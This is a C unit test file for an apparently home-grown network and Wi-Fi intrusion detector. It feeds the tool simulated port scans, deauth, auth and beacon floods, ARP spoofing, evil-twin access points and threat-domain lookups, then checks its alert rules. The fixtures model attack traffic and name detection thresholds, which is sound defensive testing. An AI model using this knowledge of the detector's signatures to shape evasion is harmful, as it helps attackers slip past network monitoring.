#include <string.h>
#include <time.h>
#include "runner.h"
#include "assoc_track.h"
#include "action_snoop.h"
#include "wifi_assess.h"
#include "sloth.h"
#include "alerts.h"
#include "views/alerts.h"
#include "beacon_snoop.h"
#include "auth_track.h"
#include "ownership.h"
#include "transit.h"
#include "rf_quality.h"

/* Helpers — build state with the exact preconditions a rule needs. */

static void seed_state(sloth_state_t *s) {
    memset(s, 0, sizeof(*s));
}

static void add_scan(sloth_state_t *s, const char *ip, int ports, int flagged) {
    scan_entry_t *e = &s->scan_entries[s->scan_count++];
    snprintf(e->ip, sizeof(e->ip), "%s", ip);
    e->port_count = ports;
    e->flagged    = flagged;
    e->first_seen = time(NULL);
    e->last_seen  = time(NULL);
}

static void add_deauth_flood(sloth_state_t *s, const uint8_t dst_mac[6]) {
    deauth_event_t *e = &s->deauth_events[s->deauth_count++];
    memset(e, 0, sizeof(*e));
    memcpy(e->dst, dst_mac, 6);
    e->reason = 7;
    e->count  = 20;
    e->flood  = 1;
}

/* Variant for tests that need to assert detail/key content — caller
 * supplies both dst and bssid so the formatted MACs are predictable. */
static void add_deauth_flood_full(sloth_state_t *s,
                                   const uint8_t dst_mac[6],
                                   const uint8_t bssid[6],
                                   uint16_t reason, int count) {
    deauth_event_t *e = &s->deauth_events[s->deauth_count++];
    memset(e, 0, sizeof(*e));
    memcpy(e->dst,   dst_mac, 6);
    memcpy(e->bssid, bssid,   6);
    e->reason = reason;
    e->count  = count;
    e->flood  = 1;
}

static void add_dns_nxdomain(sloth_state_t *s, const char *src,
                              const char *qname, time_t ts) {
    if (s->dns_log_count >= MAX_DNS_LOG) return;
    dns_log_entry_t *e = &s->dns_log[s->dns_log_count++];
    snprintf(e->src,    sizeof(e->src),    "%s", src);
    snprintf(e->qname,  sizeof(e->qname),  "%s", qname);
    snprintf(e->qtype,  sizeof(e->qtype),  "A");
    snprintf(e->answer, sizeof(e->answer), "NXDOMAIN");
    e->is_resp = 1;
    e->ts      = ts;
}

static void add_dns_query(sloth_state_t *s, const char *src, const char *qname) {
    if (s->dns_log_count >= MAX_DNS_LOG) return;
    dns_log_entry_t *e = &s->dns_log[s->dns_log_count++];
    snprintf(e->src,    sizeof(e->src),    "%s", src);
    snprintf(e->qname,  sizeof(e->qname),  "%s", qname);
    snprintf(e->qtype,  sizeof(e->qtype),  "A");
    e->ts = time(NULL);
}

static void add_conn(sloth_state_t *s, const char *remote, uint16_t port) {
    conn_t *c = &s->conns[s->conn_count++];
    snprintf(c->local_addr,  sizeof(c->local_addr),  "192.168.1.5");
    snprintf(c->remote_addr, sizeof(c->remote_addr), "%s", remote);
    c->local_port  = 12345;
    c->remote_port = port;
    c->proto       = PROTO_TCP;
}

static int find_alert(const sloth_state_t *s, alert_type_t type) {
    for (int i = 0; i < s->alert_count; i++)
        if (s->alerts[i].type == type) return i;
    return -1;
}

/* ── Rule firing ─────────────────────────────────────────── */

static void test_port_scan_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_scan(&s, "10.0.0.99", 15, 1);

    alerts_update(&s);
    ASSERT_GT(s.alert_count, 0);
    int idx = find_alert(&s, ALERT_TYPE_PORT_SCAN);
    ASSERT(idx >= 0);
    /* PORT_SCAN is LOW — reconnaissance, not an active attack. */
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_LOW);
    ASSERT_STR(s.alerts[idx].title, "PORT_SCAN");
}

static void test_port_scan_not_flagged_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_scan(&s, "10.0.0.99", 3, 0);   /* below threshold, not flagged */
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_PORT_SCAN), -1);
}

/* A burst of distinct new BSSIDs (mdk-style flood) trips the rule; a
 * handful of stable APs does not. Exercises beacon_record → the
 * new-BSSID rate counter → rule_beacon_flood end-to-end. */
static void test_beacon_flood_fires(void) {
    alerts_clear();
    beacon_clear();
    sloth_state_t s; seed_state(&s);
    for (int i = 0; i < BEACON_FLOOD_THRESH + 5; i++) {
        uint8_t b[6] = { 0x02, 0x00, 0x00, 0x00,
                         (uint8_t)(i >> 8), (uint8_t)(i & 0xff) };
        beacon_record(b, "FreeWiFi", -40, 6, "OPEN", 100, NULL);
    }
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_BEACON_FLOOD);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
}

static void test_beacon_flood_few_no_fire(void) {
    alerts_clear();
    beacon_clear();
    sloth_state_t s; seed_state(&s);
    for (int i = 0; i < 5; i++) {
        uint8_t b[6] = { 0x02, 0x00, 0x00, 0x00, 0x00, (uint8_t)i };
        beacon_record(b, "Home", -50, 6, "WPA2", 100, NULL);
    }
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_BEACON_FLOOD), -1);
}

static void test_auth_flood_fires(void) {
    alerts_clear();
    auth_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t ap[6] = { 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x01 };
    time_t now = time(NULL);
    for (int i = 0; i < AUTH_FLOOD_THRESH + 5; i++) auth_observe(ap, now);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_AUTH_FLOOD);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
    ASSERT(strstr(s.alerts[idx].detail, "aa:bb:cc:dd:ee:01") != NULL);
}

static void test_auth_flood_quiet_no_fire(void) {
    alerts_clear();
    auth_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t ap[6] = { 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x02 };
    time_t now = time(NULL);
    for (int i = 0; i < 5; i++) auth_observe(ap, now);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_AUTH_FLOOD), -1);
}

static void test_deauth_flood_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t mac[6] = { 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff };
    add_deauth_flood(&s, mac);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_DEAUTH_FLOOD);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
}

/* Kills the mac_to_str byte-index mutations (line 25) AND the
 * rule_deauth_flood detail-format mutations (lines 119-121): both
 * formatted MACs must appear in canonical lowercase-hex byte order,
 * and the reason/count must surface verbatim. */
static void test_deauth_flood_detail_content(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t dst[6]   = {0x12,0x34,0x56,0x78,0x9a,0xbc};
    uint8_t bssid[6] = {0xde,0xad,0xbe,0xef,0x00,0x42};
    add_deauth_flood_full(&s, dst, bssid, /*reason*/ 7, /*count*/ 25);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_DEAUTH_FLOOD);
    ASSERT(idx >= 0);
    const char *d = s.alerts[idx].detail;
    ASSERT(strstr(d, "12:34:56:78:9a:bc") != NULL);
    ASSERT(strstr(d, "de:ad:be:ef:00:42") != NULL);
    ASSERT(strstr(d, "reason=7")  != NULL);
    ASSERT(strstr(d, "count=25")  != NULL);
    /* Dedup key is "deauth:<dst>" — keep the same client at one alert. */
    ASSERT(strstr(s.alerts[idx].key, "deauth:12:34:56:78:9a:bc") != NULL);
}

static void test_nxdomain_burst_fires_at_threshold(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    time_t now = time(NULL);
    for (int i = 0; i < ALERT_NXDOMAIN_THRESH; i++) {
        char qn[32];
        snprintf(qn, sizeof(qn), "miss%d.example", i);
        add_dns_nxdomain(&s, "10.0.0.50", qn, now);
    }
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_NXDOMAIN_BURST) >= 0);
}

static void test_nxdomain_below_threshold_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    time_t now = time(NULL);
    for (int i = 0; i < ALERT_NXDOMAIN_THRESH - 1; i++) {
        char qn[32];
        snprintf(qn, sizeof(qn), "miss%d.example", i);
        add_dns_nxdomain(&s, "10.0.0.50", qn, now);
    }
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_NXDOMAIN_BURST), -1);
}

static void test_nxdomain_outside_window_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    time_t old = time(NULL) - (ALERT_NXDOMAIN_WINDOW_S + 10);
    for (int i = 0; i < ALERT_NXDOMAIN_THRESH + 5; i++) {
        char qn[32];
        snprintf(qn, sizeof(qn), "miss%d.example", i);
        add_dns_nxdomain(&s, "10.0.0.50", qn, old);
    }
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_NXDOMAIN_BURST), -1);
}

static void test_threat_domain_fires_on_ioc(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_dns_query(&s, "192.168.1.5", "malware.testing.com");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_THREAT_DOMAIN);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void test_threat_domain_clean_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_dns_query(&s, "192.168.1.5", "google.com");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_THREAT_DOMAIN), -1);
}

static void test_threat_ip_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_conn(&s, "192.0.2.66", 443);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_THREAT_IP);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void seed_arp(sloth_state_t *s, const char *ip,
                      uint8_t a, uint8_t b, uint8_t c,
                      uint8_t d, uint8_t e, uint8_t f) {
    if (s->arp_count >= MAX_ARP_ENTRIES) return;
    arp_entry_t *ar = &s->arp_entries[s->arp_count++];
    memset(ar, 0, sizeof(*ar));
    snprintf(ar->ip, sizeof(ar->ip), "%s", ip);
    ar->mac[0] = a; ar->mac[1] = b; ar->mac[2] = c;
    ar->mac[3] = d; ar->mac[4] = e; ar->mac[5] = f;
}

static void test_arp_spoof_no_alert_on_first_obs(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_arp(&s, "192.168.1.1", 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x01);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ARP_SPOOF), -1);
}

static void test_arp_spoof_fires_on_mac_change(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_arp(&s, "192.168.1.1", 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x01);
    alerts_update(&s);

    /* Second poll — same IP, different MAC. */
    s.arp_count = 0;
    seed_arp(&s, "192.168.1.1", 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x99);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ARP_SPOOF);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void test_arp_spoof_silent_on_same_mac(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_arp(&s, "192.168.1.1", 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x01);
    alerts_update(&s);
    s.arp_count = 0;
    seed_arp(&s, "192.168.1.1", 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x01);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ARP_SPOOF), -1);
}

static void test_arp_spoof_skips_multicast_mac(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* Multicast bit set (0x01) — ARP shouldn't normally see this,
     * but the rule should defensively skip. */
    seed_arp(&s, "224.0.0.1", 0x01, 0x00, 0x5e, 0x00, 0x00, 0x01);
    alerts_update(&s);
    s.arp_count = 0;
    seed_arp(&s, "224.0.0.1", 0x01, 0x00, 0x5e, 0x00, 0x00, 0xff);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ARP_SPOOF), -1);
}

/* Kills the `all_zero = 1` init mutation AND the `j < 6` byte-loop bound
 * mutations: if the rule ever stops skipping an all-zero MAC, it will
 * subsequently treat the all-zero MAC as a legitimate observation and
 * fire ARP_SPOOF the next time a real MAC appears for that IP. */
static void test_arp_spoof_skips_all_zero_mac(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    seed_arp(&s, "10.0.0.42", 0, 0, 0, 0, 0, 0);
    alerts_update(&s);
    s.arp_count = 0;
    /* If the all-zero MAC was recorded, a real MAC for the same IP
     * will now look like a spoof. The rule must have skipped, so this
     * is treated as a first observation and no alert fires. */
    seed_arp(&s, "10.0.0.42", 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x01);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ARP_SPOOF), -1);
}

/* Kills const-mutations on the snprintf byte indices (lines 209-215):
 * if mac[k] indices drift, the formatted MAC strings in the alert
 * detail will no longer match the canonical form. */
static void test_arp_spoof_detail_contains_both_macs(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* Both MACs use even first-byte (multicast bit clear) so the rule
     * doesn't skip them — 0x11 would have looked random but its LSB
     * marks it as multicast. */
    seed_arp(&s, "192.168.1.7", 0x10, 0x22, 0x33, 0x44, 0x55, 0x66);
    alerts_update(&s);
    s.arp_count = 0;
    seed_arp(&s, "192.168.1.7", 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ARP_SPOOF);
    ASSERT(idx >= 0);
    /* New MAC must appear, formatted byte-by-byte in canonical order. */
    ASSERT(strstr(s.alerts[idx].detail, "aa:bb:cc:dd:ee:ff") != NULL);
    /* Old MAC must appear too — detail is "X now claims MAC Y (was Z)". */
    ASSERT(strstr(s.alerts[idx].detail, "10:22:33:44:55:66") != NULL);
    /* IP must appear as the subject of the alert. */
    ASSERT(strstr(s.alerts[idx].detail, "192.168.1.7") != NULL);
}

/* Kills the `g_arp_hist_n >= MAX_ARP_ENTRIES` overflow guard mutation
 * (`>= -> >`): if the guard loosens by one, the rule writes past the
 * end of g_arp_hist. After saturating the history with first-observations,
 * one more new IP must not crash and must not record. The follow-up
 * spoof check for that overflowing IP must still treat it as a first
 * observation (no alert), proving the entry was rejected by the guard. */
static void test_arp_spoof_history_overflow_safe(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* Saturate history with MAX_ARP_ENTRIES distinct IPs, each a fresh
     * observation. We can't fit them all in one poll (arp_entries is
     * also MAX_ARP_ENTRIES wide), so chunk in batches. */
    char ip[32];
    int total = 0;
    while (total < MAX_ARP_ENTRIES) {
        s.arp_count = 0;
        int batch = MAX_ARP_ENTRIES - total;
        if (batch > 64) batch = 64;
        for (int i = 0; i < batch; i++) {
            snprintf(ip, sizeof(ip), "10.%d.%d.1",
                     (total + i) / 256, (total + i) % 256);
            seed_arp(&s, ip, 0xaa, 0xbb, 0xcc, 0xdd,
                     (uint8_t)((total + i) >> 8),
                     (uint8_t)(total + i));
        }
        alerts_update(&s);
        total += batch;
    }
    /* History is now full. A brand-new IP must not be recorded; if the
     * guard mutated to `>` we'd write past g_arp_hist. */
    s.arp_count = 0;
    seed_arp(&s, "172.16.0.99", 0x01, 0x02, 0x03, 0x04, 0x05, 0x06);
    alerts_update(&s);
    /* The overflow IP wasn't recorded — a different MAC on the next
     * poll must still look like a first observation, not a spoof. */
    s.arp_count = 0;
    seed_arp(&s, "172.16.0.99", 0x99, 0x88, 0x77, 0x66, 0x55, 0x44);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ARP_SPOOF), -1);
}

/* ── Evil-twin AP ────────────────────────────────────────── */

static void add_beacon(sloth_state_t *s, const char *ssid,
                        const uint8_t bssid[6], const char *enc) {
    if (s->beacon_count >= MAX_BEACON_APS) return;
    beacon_ap_t *b = &s->beacon_aps[s->beacon_count++];
    memset(b, 0, sizeof(*b));
    snprintf(b->ssid, sizeof(b->ssid), "%s", ssid);
    memcpy(b->bssid, bssid, 6);
    snprintf(b->enc, sizeof(b->enc), "%s", enc);
    b->channel    = 6;
    b->signal_dbm = -55;
    b->last_seen  = time(NULL);
    /* Mirror what beacon_record does on insert — fp.oui = bssid[0..2]. */
    b->fp.oui[0] = bssid[0];
    b->fp.oui[1] = bssid[1];
    b->fp.oui[2] = bssid[2];
}

static void test_evil_twin_open_plus_wpa2_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0xdd,0xee,0x01};
    uint8_t b[6] = {0xaa,0xbb,0xcc,0xdd,0xee,0x02};
    add_beacon(&s, "Cafe-Free", a, "OPEN");
    add_beacon(&s, "Cafe-Free", b, "WPA2");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_EVIL_TWIN);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void test_evil_twin_two_wpa2_no_fire(void) {
    /* Legit mesh / multi-AP enterprise — same SSID + same strong
     * security across BSSIDs. No alert. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0xdd,0xee,0x01};
    uint8_t b[6] = {0xaa,0xbb,0xcc,0xdd,0xee,0x02};
    add_beacon(&s, "Office", a, "WPA2");
    add_beacon(&s, "Office", b, "WPA2");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_EVIL_TWIN), -1);
}

static void test_evil_twin_two_open_no_fire(void) {
    /* Both BSSIDs OPEN — common at airports, no strong sibling to
     * mismatch against. No alert. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0xdd,0xee,0x01};
    uint8_t b[6] = {0xaa,0xbb,0xcc,0xdd,0xee,0x02};
    add_beacon(&s, "Airport-Free", a, "OPEN");
    add_beacon(&s, "Airport-Free", b, "OPEN");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_EVIL_TWIN), -1);
}

static void test_evil_twin_different_ssids_no_fire(void) {
    /* OPEN AP and WPA2 AP with DIFFERENT SSIDs — coincidence, not
     * twin. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0xdd,0xee,0x01};
    uint8_t b[6] = {0xaa,0xbb,0xcc,0xdd,0xee,0x02};
    add_beacon(&s, "Open-Net", a, "OPEN");
    add_beacon(&s, "Locked",   b, "WPA2");
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_EVIL_TWIN), -1);
}

/* Kills the per-byte snprintf mutations on both BSSIDs (lines 594-599):
 * the detail string must contain the SSID and both BSSIDs in canonical
 * lowercase-hex byte order. */
static void test_evil_twin_detail_contains_bssids_and_ssid(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* Distinctive byte patterns so a wrong index would render a
     * visibly-different string. */
    uint8_t a[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    uint8_t b[6] = {0xaa,0xbb,0xcc,0xdd,0xee,0xff};
    add_beacon(&s, "TwinNet", a, "OPEN");
    add_beacon(&s, "TwinNet", b, "WPA2");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_EVIL_TWIN);
    ASSERT(idx >= 0);
    const char *d = s.alerts[idx].detail;
    ASSERT(strstr(d, "TwinNet")           != NULL);
    ASSERT(strstr(d, "11:22:33:44:55:66") != NULL);
    ASSERT(strstr(d, "aa:bb:cc:dd:ee:ff") != NULL);
    /* Dedup key is "twin:<ssid>" — stable across the (a,b) /
     * (b,a) iteration ordering. */
    ASSERT(strstr(s.alerts[idx].key, "twin:TwinNet") != NULL);
}

/* Same SSID + same cipher + DIFFERENT vendor OUI — fires the new
 * fingerprint-based WARN branch (Pineapple / ESP32 mimicking a legit
 * AP's security). Dedup key is "twin-fp:<ssid>" so it coexists with
 * the CRIT "twin:" key. */
static void test_evil_twin_same_cipher_diff_oui_fires_warn(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};  /* OUI = aa:bb:cc */
    uint8_t b[6] = {0x11,0x22,0x33,0x44,0x55,0x66};  /* OUI = 11:22:33 */
    add_beacon(&s, "Cafe-Net", a, "WPA2");
    add_beacon(&s, "Cafe-Net", b, "WPA2");
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_EVIL_TWIN);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_WARN);
    ASSERT(strstr(s.alerts[idx].key, "twin-fp:Cafe-Net") != NULL);
    ASSERT(strstr(s.alerts[idx].detail, "Cafe-Net") != NULL);
    ASSERT(strstr(s.alerts[idx].detail, "aa:bb:cc:01:02:03") != NULL);
    ASSERT(strstr(s.alerts[idx].detail, "11:22:33:44:55:66") != NULL);
}

/* ── Cross-vendor infrastructure is not a twin (#51) ────────
 *
 * Scene from docs/personas/wifi-surveyor.md S2.1: a router and a
 * store-bought range extender from a different vendor, both beaconing
 * the client's SSID with identical security. Same SSID, same cipher,
 * different OUI, differing vendor-IE hash — every input the WARN branch
 * keys on, plus the CRIT escalation. The 802.11k Neighbor Report is
 * what distinguishes it from an impostor. */

/* Make `ap` advertise `bssid` as an 802.11k neighbor (tag 52). */
static void add_neighbor(sloth_state_t *s, const uint8_t ap_bssid[6],
                         const uint8_t neighbor_bssid[6]) {
    for (int i = 0; i < s->beacon_count; i++) {
        beacon_ap_t *ap = &s->beacon_aps[i];
        if (memcmp(ap->bssid, ap_bssid, 6) != 0) continue;
        if (ap->neighbor_count >= MAX_AP_NEIGHBORS) return;
        ap_neighbor_t *n = &ap->neighbors[ap->neighbor_count++];
        memcpy(n->bssid, neighbor_bssid, 6);
        n->channel  = ap->channel;
        n->phy_type = 0;
        return;
    }
}

/* Mutual advertisement — the controller-managed case. No alert. */
static void test_evil_twin_mutual_neighbors_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t router[6]   = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t extender[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    add_beacon(&s, "CorpWiFi", router,   "WPA2");
    add_beacon(&s, "CorpWiFi", extender, "WPA2");
    /* Differing vendor-IE hashes: without the neighbor check this is
     * the CRIT escalation path, not merely WARN. */
    s.beacon_aps[0].fp.vendor_ies_hash = 0xA11CE;
    s.beacon_aps[1].fp.vendor_ies_hash = 0xB0B;
    add_neighbor(&s, router,   extender);
    add_neighbor(&s, extender, router);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_EVIL_TWIN), -1);
}

/* One-directional is enough — in mixed deployments only the
 * controller-managed side may emit tag 52. */
static void test_evil_twin_one_way_neighbor_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t router[6]   = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t extender[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    add_beacon(&s, "CorpWiFi", router,   "WPA2");
    add_beacon(&s, "CorpWiFi", extender, "WPA2");
    add_neighbor(&s, router, extender);   /* extender lists nobody */
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_EVIL_TWIN), -1);

    /* ...and the same holds with the roles reversed. */
    alerts_clear();
    sloth_state_t t; seed_state(&t);
    add_beacon(&t, "CorpWiFi", router,   "WPA2");
    add_beacon(&t, "CorpWiFi", extender, "WPA2");
    add_neighbor(&t, extender, router);
    alerts_update(&t);
    ASSERT_EQ(find_alert(&t, ALERT_TYPE_EVIL_TWIN), -1);
}

/* The suppression must be evidence-based, not blanket. An impostor
 * cannot appear in the real AP's neighbor list, so a cross-vendor pair
 * with neighbor reports that name *other* BSSIDs still fires — this is
 * what stops the fix from blinding the detector. */
static void test_evil_twin_unrelated_neighbors_still_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t router[6]   = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t rogue[6]    = {0x11,0x22,0x33,0x44,0x55,0x66};
    uint8_t elsewhere[6]= {0x99,0x88,0x77,0x66,0x55,0x44};
    add_beacon(&s, "CorpWiFi", router, "WPA2");
    add_beacon(&s, "CorpWiFi", rogue,  "WPA2");
    /* The router advertises a real sibling on another floor; the rogue
     * is not in that list and names nobody. */
    add_neighbor(&s, router, elsewhere);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_EVIL_TWIN);
    ASSERT(idx >= 0);
    ASSERT(strstr(s.alerts[idx].key, "twin-fp:CorpWiFi") != NULL);
}

/* No 802.11k at all — the budget-extender case. We have no evidence of
 * a relationship, so the OUI heuristic still governs and the alert
 * still fires. Pinned deliberately: this is the documented residual
 * limitation of #51, not an oversight. */
static void test_evil_twin_no_neighbor_reports_still_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t b[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    add_beacon(&s, "CorpWiFi", a, "WPA2");
    add_beacon(&s, "CorpWiFi", b, "WPA2");
    alerts_update(&s);
    ASSERT(find_alert(&s, ALERT_TYPE_EVIL_TWIN) >= 0);
}

/* A neighbor relationship must not rescue a genuine weak/strong twin.
 * An OPEN clone of a WPA2 SSID is a real finding even between APs that
 * know each other — that is a misconfigured or compromised extender,
 * not a benign one. The CRIT branch is deliberately left unguarded. */
static void test_evil_twin_neighbors_do_not_excuse_open_clone(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t strong[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t open_ap[6]= {0x11,0x22,0x33,0x44,0x55,0x66};
    add_beacon(&s, "CorpWiFi", open_ap, "OPEN");
    add_beacon(&s, "CorpWiFi", strong,  "WPA2");
    add_neighbor(&s, strong,  open_ap);
    add_neighbor(&s, open_ap, strong);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_EVIL_TWIN);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

/* ── the predicate itself ───────────────────────────────── */

static void test_infrastructure_peers_predicate(void) {
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t b[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    add_beacon(&s, "N", a, "WPA2");
    add_beacon(&s, "N", b, "WPA2");
    const beacon_ap_t *pa = &s.beacon_aps[0];
    const beacon_ap_t *pb = &s.beacon_aps[1];

    ASSERT_EQ(ap_infrastructure_peers(pa, pb), 0);   /* no reports yet */
    ASSERT_EQ(ap_advertises_neighbor(pa, b), 0);

    add_neighbor(&s, a, b);
    ASSERT_EQ(ap_advertises_neighbor(pa, b), 1);
    ASSERT_EQ(ap_advertises_neighbor(pb, a), 0);     /* not symmetric */
    ASSERT_EQ(ap_infrastructure_peers(pa, pb), 1);   /* ...but this is */
    ASSERT_EQ(ap_infrastructure_peers(pb, pa), 1);

    /* An AP paired with itself is not a relationship. */
    ASSERT_EQ(ap_infrastructure_peers(pa, pa), 0);
    /* NULL is safe. */
    ASSERT_EQ(ap_infrastructure_peers(NULL, pb), 0);
    ASSERT_EQ(ap_infrastructure_peers(pa, NULL), 0);
    ASSERT_EQ(ap_advertises_neighbor(NULL, b), 0);
    ASSERT_EQ(ap_advertises_neighbor(pa, NULL), 0);
}

/* A truncated / over-large neighbor_count must not walk off the array. */
static void test_infrastructure_peers_clamps_neighbor_count(void) {
    sloth_state_t s; seed_state(&s);
    uint8_t a[6] = {0xaa,0xbb,0xcc,0x01,0x02,0x03};
    uint8_t b[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
    add_beacon(&s, "N", a, "WPA2");
    add_beacon(&s, "N", b, "WPA2");
    s.beacon_aps[0].neighbor_count = MAX_AP_NEIGHBORS + 99;
    ASSERT_EQ(ap_advertises_neighbor(&s.beacon_aps[0], b), 0);
}


/* ── operator-designated networks (#52) ─────────────────────
 *
 * Every test here clears the designation tables first: they are
 * process-wide, and a leaked designation would silently change the
 * severity of unrelated flood tests. */

static void add_pnl(sloth_state_t *s, const uint8_t mac[6],
                    const char *ssid) {
    pnl_client_t *c = &s->pnl_clients[s->pnl_count++];
    memset(c, 0, sizeof(*c));
    memcpy(c->mac, mac, 6);
    snprintf(c->ssids[0], 33, "%s", ssid);
    c->ssid_count  = 1;
    c->probe_count = 12;
}

static void add_assoc_entry(sloth_state_t *s, const uint8_t sta[6],
                            const uint8_t bssid[6], const char *ssid) {
    assoc_t *a = &s->assocs[s->assoc_count++];
    memset(a, 0, sizeof(*a));
    memcpy(a->sta_mac, sta, 6);
    memcpy(a->bssid,   bssid, 6);
    snprintf(a->ssid, sizeof(a->ssid), "%s", ssid);
    a->source = ASSOC_SRC_EAPOL;
}

/* The headline case: a device out there remembers the operator's
 * network by name and is not on it. */
static void test_my_net_recon_fires_for_unassociated_client(void) {
    alerts_clear(); ownership_clear();
    ownership_add_ssid("CorpWiFi");
    sloth_state_t s; seed_state(&s);
